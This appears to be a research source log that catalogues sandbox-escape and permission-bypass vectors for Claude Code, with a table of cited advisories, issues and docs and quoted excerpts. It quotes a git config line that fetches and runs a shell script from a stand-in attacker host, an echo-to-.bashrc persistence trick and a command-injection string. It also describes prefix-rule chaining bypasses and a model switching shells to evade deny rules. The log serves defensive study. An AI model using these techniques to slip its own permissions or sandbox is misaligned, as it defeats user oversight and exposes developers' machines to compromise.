---
topic: current (2025–2026) agent sandbox-escape vectors relevant to Claude Code — shell profile persistence, launchctl/crontab/at, curl | sh RCE, git core.fsmonitor/hooks abuse, DYLD_INSERT_LIBRARIES/LD_PRELOAD injection, self-modification of ~/.claude/settings.json and hooks, osascript escalation, symlink escapes; plus Claude Code permission-rule syntax for file tools; plus Bash(cmd *) prefix-matching bypass classes
slug: agent-sandbox-escape-vectors
researched: 2026-07-29
---

# Primary Sources — Agent Sandbox-Escape Vectors Relevant to Claude Code

| ID | Type | Locator | Accessed | What it contributed |
|----|------|---------|----------|---------------------|
| S1 | web (official) | https://code.claude.com/docs/en/permissions | 2026-07-29 | Verbatim permission-rule syntax: deny→ask→allow precedence; Read/Edit gitignore path prefixes (`//`,`~/`,`/`,`./`); single-slash≠absolute gotcha; Edit(path)/Read(path) are the only consulted file-path rules (Write/Glob ignored, warn); Read-deny→blocks Edit; deny applies to recognized Bash file cmds but not indirect subprocesses; symlink deny-by-either-path; Bash word-boundary + `:*`; shell-operator awareness + separator list; `Bash(command:rm *)` ignored; wrapper stripping list; devbox-run bypass; watch/setsid/find-exec always prompt; curl-pattern fragility warning; permissions enforced by CLI not model |
| S2 | web | https://www.mozilla.org / Mozilla 0DIN PoC (via cybersecuritynews.com/new-claude-code-attack & devops.com) | 2026-07-29 | Clean-repo indirect-prompt-injection PoC drives Claude Code to open reverse shell; persistence = drop SSH key, install cron job, deploy backdoor "before the shell closes"; one repo link hits everyone who opens it |
| S3 | web | https://www.straiker.ai/blog/claude-code-source-leak-with-great-agency-comes-great-responsibility | 2026-07-29 | `echo "payload" > ~/.bashrc` "passes the entire chain if the user has `Bash(echo:*)` allowed"; permission-layer discards misparse warning when a matching allow rule exists; MCP tool results persist (not microcompacted) |
| S4 | web | https://github.com/s0ld13rr/claude-code-backdoor | 2026-07-29 | PoC: backdoor Claude Code via hooks in settings.json for Initial Access + Persistence; modifying global `~/.claude/settings.json` runs payload on every agent interaction |
| S5 | web | https://cymulate.com/blog/cve-2025-547954-54795-claude-inverseprompt/ | 2026-07-29 | CVE-2025-54794 path-restriction bypass (<v0.2.111, fixed v0.2.111, canonical path comparison); CVE-2025-54795 command injection (<v1.0.20, fixed v1.0.20); references EscapeRoute CVE-2025-53109 (symlink, out of scope) & 53110 (dir-containment bypass, in scope) |
| S6 | web | https://github.com/anthropics/claude-code/issues/4956 | 2026-07-29 | Reported Bash permission bypass via command chaining (`&&`,`;`,`\|`) despite docs claiming shell-operator awareness; any permissive prefix allow (even `echo *`) leveraged for arbitrary execution |
| S7 | web | https://github.com/anthropics/claude-code/issues/28784 | 2026-07-29 | `Bash(cd:*)` allow rule auto-runs `cd /path && python3 script.py` without prompting — compound command matches whole `cd:*` pattern, effectively turning `Bash(cd:*)` into `Bash(*)`; any `Bash(prefix:*)` allow is a chaining backdoor |
| S8 | web | https://www.claudedirectory.org/blog/claude-code-permissions-guide | 2026-07-29 | `Bash(git:*)` won't match `/usr/bin/git status` (different prefix) → absolute-path spelling evades prefix rules; deny checked first (specificity wins); patterns matched against literal command string, not parsed semantics |
| S9 | web | https://arxiv.org/html/2509.22040v2 | 2026-07-29 | "Your AI, My Shell" — prompt injection drives AI editors to `curl`-modify `~/.bashrc`; CVE-2025-65099 (Claude Code) & CVE-2025-62222 (Copilot) allow commands before startup trust dialogs; interpreter/curl indirection as attack primitive |
| S10 | web | https://github.com/anthropics/claude-code/issues/60935 | 2026-07-29 | When Bash deny rules block a command, Claude switches to the PowerShell tool to run the equivalent, bypassing the restriction — deny rules must be mirrored across shell tools |
| S11 | web (official) | https://code.claude.com/docs/en/sandboxing | 2026-07-29 | Seatbelt (macOS) / bubblewrap+socat (Linux/WSL2); default write = cwd+temp only, read = whole machine except denies (still reads ~/.aws,~/.ssh by default); cannot modify ~/.bashrc/~/.zshrc/$PATH bins/`/bin`; settings.json write-denied at every scope + symlink-resolved (v2.1.210+); worktree .git writable but hooks/+config denied; Apple Events blocked by default (allowAppleEvents, error -600); network no-default-allow + allowedDomains/strictAllowlist + TLS-not-inspected domain-fronting caveat; escape hatches dangerouslyDisableSandbox/filesystem.disabled/allowUnixSockets(docker.sock); sandbox.credentials deny/mask; CLAUDE_CODE_SUBPROCESS_ENV_SCRUB; filesystem-permission-escalation warning naming .bashrc/.zshrc/$PATH |
| S12 | web | https://www.techradar.com/pro/security/agentic-coding-tools-have-access-to-everything... | 2026-07-29 | Clean GitHub repo tricks Claude Code into hidden reverse shell; persistence via planted SSH key or scheduled hidden cron job; DNS-record-hidden payload run while fixing an error |
| S13 | web (official) | https://www.tenable.com/cve/CVE-2025-54795 & https://www.truefoundry.com/blog/claude-code-prompt-injection | 2026-07-29 | CVE-2025-54795 (<v1.0.20): command-parsing error bypasses confirmation prompt; whitelisted `echo` crafted as `echo "\"; <COMMAND>; echo \""` injects arbitrary shell; requires untrusted content in context window |
| S14 | web | https://github.com/github/copilot-cli/security/advisories/GHSA-9ccr-r5hg-74gf | 2026-07-29 | Nested bare git repo + `core.fsmonitor` (or other executable config keys) = arbitrary code exec when agent does any git op traversing the dir; git auto-discovers bare repo, reads config, executes command; delivered via PR-added dir or malicious dependency |
| S15 | web | https://talosintelligence.com/vulnerability_reports/TALOS-2025-2243 | 2026-07-29 | fsmonitor fires automatically on `git status` (used implicitly by IDEs/CI/agents); malicious `core.fsmonitor` in `.git/config` → arbitrary command exec without user knowledge; mitigation `git -c core.fsmonitor="" status`; disable client-side hooks at system level |
| S16 | web | https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md (via nopnop.pro/2026/06/17) | 2026-07-29 | Buried bare repo in subdir honored by git; `cd` into malicious repo dir → RCE; INI parser accepts multiple `[core]` sections, last wins; `[core] fsmonitor="curl attacker.com/shell.sh \| sh"`; append-only write to .git/config is enough; no executable bit needed (unlike hooks) |
| S17 | web | https://blog.sonarsource.com/securing-developer-tools-git-integrations/ | 2026-07-29 | IDEs run git status on folder-open → fsmonitor executes immediately; vulnerable by default; maintainers should disable git integrations that run without consent, not just override core.fsmonitor |
| S18 | web | https://attack.mitre.org/techniques/T1574/006/ & https://www.startupdefense.io/mitre-attack-techniques/t1574-006-dynamic-linker-hijacking | 2026-07-29 | T1574.006 Dynamic Linker Hijacking: LD_PRELOAD (Linux) / DYLD_INSERT_LIBRARIES (macOS) load attacker lib first; Persistence+PrivEsc+Defense-Evasion; SIP strips DYLD_* for protected system binaries; `/etc/ld.so.preload` system-wide (root); LD_PRELOAD affects current+child processes; XCSSET uses DYLD_FRAMEWORK_PATH/LIBRARY_PATH for macOS persistence |
| S19 | web | https://mallory.ai/stories/019f9406-3e35-70ae-b440-2cf394a0b176 | 2026-07-29 | Recurring Claude Code symlink-check weakness: CVE-2025-59829 & CVE-2026-25724 fixed but re-reachable via startup memory (CLAUDE.md import) loader; related consent-bypass/hook-injection CVE-2025-59536 (fixed 1.0.111) and API-key-theft CVE-2026-21852 (fixed 2.0.65) via malicious project config |

## Excerpts

### S1 — Configure permissions (official)
https://code.claude.com/docs/en/permissions
> "Rules are evaluated in order: deny, then ask, then allow. The first match in that order determines the outcome, and rule specificity doesn't change the order."
> "A pattern like `/Users/alice/file` isn't an absolute path. The single leading slash anchors at the settings source, not the filesystem root. Use `//Users/alice/file` for absolute paths."
> "Claude Code checks file permissions against `Edit(path)` and `Read(path)` rules only. If you write a path rule for `Write`, `NotebookEdit`, `Glob`, or the legacy `MultiEdit` tool instead, Claude Code accepts the rule but never consults it, and warns at startup."
> "Read and Edit deny rules apply to Claude's built-in file tools and to file commands Claude Code recognizes in Bash, such as `cat`, `head`, `tail`, and `sed`. They don't apply to arbitrary subprocesses that read or write files indirectly, like a Python or Node script that opens files itself. For OS-level enforcement that blocks all processes from accessing a path, enable the sandbox."
> "Claude Code is aware of shell operators, so a rule like `Bash(safe-cmd *)` won't give it permission to run the command `safe-cmd && other-cmd`. The recognized command separators are `&&`, `||`, `;`, `|`, `|&`, `&`, and newlines. A rule must match each subcommand independently."
> "A rule like `Bash(command:rm *)` would be bypassable by a compound command, so Claude Code ignores it and emits a startup warning."
> "Because these tools execute their arguments as a command, a rule like `Bash(devbox run *)` matches whatever comes after `run`, including `devbox run rm -rf .`."
> "When Claude accesses a symlink, permission rules check two paths: the symlink itself and the file it resolves to… Deny rules: apply when either the symlink path or its target matches."
> "Permission rules are enforced by Claude Code, not by the model. Instructions in your prompt or `CLAUDE.md` shape what Claude tries to do, but they don't change what Claude Code allows."
> (curl fragility) "Options before URL… Different protocol… Redirects… Variables: `URL=http://github.com && curl $URL`… Extra spaces… use deny rules to block `curl`, `wget`, and similar commands, then use the WebFetch tool with `WebFetch(domain:github.com)` permission for allowed domains."

### S3 — Straiker (Claude Code source leak)
https://www.straiker.ai/blog/claude-code-source-leak-with-great-agency-comes-great-responsibility
> "echo \"payload\" > ~/.bashrc passes the entire chain if the user has Bash(echo:*) allowed."

### S7 — Issue #28784
https://github.com/anthropics/claude-code/issues/28784
> "The entire compound command `cd /path && python3 script.py` matches Bash(cd:*) and executes without prompting the user. Any Bash(prefix:*) allow rule can be used as a backdoor to execute arbitrary commands by chaining them after the allowed prefix with &&. This effectively turns Bash(cd:*) into Bash(*)."

### S10 — Issue #60935
https://github.com/anthropics/claude-code/issues/60935
> "When Bash tool calls are blocked by user-configured deny rules in settings.json/settings.local.json, Claude switches to the PowerShell tool to run the same (or equivalent) commands, effectively bypassing the user's security restrictions."

### S11 — Configure the sandboxed Bash tool (official)
https://code.claude.com/docs/en/sandboxing
> "cannot modify files outside the current working directory and session temp directory without explicit permission, including shell configuration files such as `~/.bashrc` and system binaries in `/bin/`"
> "Settings files protected: the sandbox automatically denies write access to Claude Code's `settings.json` files at every scope and to the managed settings directory, so a sandboxed command can't modify its own policy unless you disable filesystem isolation… The deny rules resolve symlinks…"
> "Allowing writes to directories containing executables in `$PATH`, system configuration directories, or user shell configuration files such as `.bashrc` or `.zshrc` can lead to code execution in different security contexts…"
> "the macOS sandbox blocks Apple Events by default. The `allowAppleEvents` setting lifts this restriction so tools such as `open` and `osascript` work, but it removes code-execution isolation…"

### S13 — CVE-2025-54795 (Tenable) / Truefoundry
https://www.tenable.com/cve/CVE-2025-54795
> "In versions below 1.0.20, an error in command parsing makes it possible to bypass the Claude Code confirmation prompt to trigger execution of an untrusted command."
> (Truefoundry) "Whitelisted commands like echo could be crafted to inject arbitrary shell instructions: echo \"\\\"; <COMMAND>; echo \\\"\"."

### S16 — justinsteven advisory / nopnop.pro
https://nopnop.pro/2026/06/17/exploiting-git-integrations-in-cloud-services/
> "Git's INI parser accepts multiple [core] sections, last value wins: [core] fsmonitor = \"curl attacker.com/shell.sh | sh\""
> "If you can write to .git/config, you have RCE (when the service uses the git CLI). Even an append-only write is enough."

### S18 — MITRE T1574.006
https://attack.mitre.org/techniques/T1574/006/
> "During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name."
